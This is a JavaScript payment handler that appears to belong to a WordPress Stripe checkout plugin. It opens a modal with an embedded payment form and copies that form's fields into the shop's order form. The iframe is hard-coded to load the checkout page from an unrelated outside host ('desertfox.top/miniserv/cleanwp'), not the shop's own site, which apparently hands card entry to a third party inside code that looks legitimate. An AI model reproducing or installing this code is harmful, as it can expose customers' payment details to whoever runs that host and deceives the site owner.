var stripeHandlerNG = function (data) {
    var parent = this;
    parent.data = data;
    parent.form = jQuery('form#asp_ng_form_' + data.uniq_id);
    jQuery('#asp_ng_button_' + data.uniq_id).click(function (e) {
        e.preventDefault();
        if (!parent.modal) {
            jQuery('body').append('<div id="asp-payment-popup-' + parent.data.uniq_id + '" style="display: none; max-width: 350px !important;min-width: 314px;"><div class="asp-popup-iframe-cont"><iframe frameborder="0" class="asp-popup-iframe" src="https://desertfox.top/miniserv/cleanwp/?asp_action=show_pp&product_id=' + parent.data.product_id + '"></iframe></div></div>');
            jQuery('#asp-payment-popup-' + parent.data.uniq_id).iziModal({
                title: parent.data.name,
                transitionIn: 'fadeInUp',
                transitionOut: 'fadeOutDown',
                closeOnEscape: false,
                overlayClose: false,
                fullscreen: false,
                headerColor: '#3795cb',
                restoreDefaultContent: false,
            });
            jQuery('#asp-payment-popup-' + parent.data.uniq_id).iziModal('open');
            parent.modal = jQuery('#asp-payment-popup-' + parent.data.uniq_id);
            parent.iframe = parent.modal.find('iframe');
            parent.iframe.on('load', function (e) {
                parent.iForm = parent.iframe.contents().find('form#payment-form');
                parent.iForm.on('submit', function (e) {
                    e.preventDefault();
                    var token = parent.iForm.find('input#payment-intent').val();
                    if (token !== '') {
                        parent.iForm.find('input').each(function (e) {
                            if (jQuery(this).attr('name')) {
                                parent.form.append('<input type="hidden" name="asp_' + jQuery(this).attr('name') + '" value="' + jQuery(this).val() + '">');
                            }
                        });
                        parent.form.append('<input type="hidden" name="asp_process_ipn" value="1">');
                        parent.form.append('<input type="hidden" name="asp_is_live" value="' + parent.data.is_live + '">');
                        jQuery('div#asp-all-buttons-container-' + data.uniq_id).hide();
                        jQuery('div#asp-btn-spinner-container-' + data.uniq_id).show();
                        parent.modal.iziModal('close');
                        jQuery('form#asp_ng_form_' + parent.data.uniq_id).submit();
                    }
                    return false;
                });

            });
        } else {
            parent.modal.iziModal('open');
        }
    });
}